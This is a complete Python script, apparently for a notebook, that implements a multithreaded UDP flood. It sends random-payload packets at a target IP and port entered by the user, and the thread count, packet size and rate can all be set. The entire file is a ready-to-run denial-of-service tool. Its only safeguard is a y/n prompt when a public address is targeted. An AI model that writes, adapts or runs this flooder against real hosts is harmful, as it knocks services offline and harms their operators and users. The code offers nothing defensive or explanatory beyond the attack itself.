
import socket
import random
import time
import threading
from IPython.display import display, HTML

class AdvancedUDPFlooder:
    def __init__(self, target_ip, target_port, duration, threads=50, packet_size=1024, pps=1000):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads = threads
        self.packet_size = packet_size
        self.pps = pps  # Packets per second (per thread)
        self.packets_sent = 0
        self.running = False

    def flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Randomize source port and payload
        src_port = random.randint(1024, 65535)
        sock.bind(('0.0.0.0', src_port))
        payload = random._urandom(self.packet_size)
        
        timeout = time.time() + self.duration
        packet_count = 0
        
        while self.running and time.time() < timeout:
            try:
                sock.sendto(payload, (self.target_ip, self.target_port))
                packet_count += 1
                time.sleep(1 / self.pps)  # Rate limiting
            except Exception as e:
                print(f"[!] Error in thread: {e}")
                break
        
        with threading.Lock():
            self.packets_sent += packet_count
        sock.close()

    def start(self):
        self.running = True
        threads = []
        
        print(f"\n[+] Starting UDP flood to {self.target_ip}:{self.target_port}")
        print(f"[+] Duration: {self.duration}s | Threads: {self.threads}")
        print(f"[+] Packet size: {self.packet_size} bytes | Target PPS: {self.pps * self.threads:,}\n")
        
        # Start threads
        for _ in range(self.threads):
            t = threading.Thread(target=self.flood)
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Progress display
        start_time = time.time()
        while time.time() < start_time + self.duration and self.running:
            elapsed = int(time.time() - start_time)
            remaining = max(0, self.duration - elapsed)
            print(f"\r[+] Attacking... {elapsed}s elapsed | {remaining}s remaining | Packets sent: {self.packets_sent:,}", end="")
            time.sleep(0.5)
        
        self.running = False
        for t in threads:
            t.join()
        
        print(f"\n\n[+] Attack finished")
        print(f"[+] Total packets sent: {self.packets_sent:,}")
        print(f"[+] Average PPS: {int(self.packets_sent / self.duration):,}")

def run_flood():
    # Create form for input
    
    target_ip = input("[?] Target IP: ").strip()
    target_port = int(input("[?] Target Port: "))
    duration = int(input("[?] Attack Duration (seconds): "))
    threads = int(input("[?] Threads (default 50): ") or 50)
    packet_size = int(input("[?] Packet Size (bytes, default 1024): ") or 1024)
    pps = int(input("[?] Packets Per Second per Thread (default 1000): ") or 1000)
    
    # Safety check
    if not target_ip.startswith(("192.168.", "10.", "172.16.", "127.0.0.1")):
        confirm = input(f"\n[!] WARNING: Targeting {target_ip}. Continue? (y/n): ")
        if confirm.lower() != "y":
            print("[!] Aborted by user")
            return
    
    try:
        attacker = AdvancedUDPFlooder(
            target_ip=target_ip,
            target_port=target_port,
            duration=duration,
            threads=threads,
            packet_size=packet_size,
            pps=pps
        )
        attacker.start()
    except Exception as e:
        print(f"\n[!] Error: {e}")

# Run the tool
run_flood()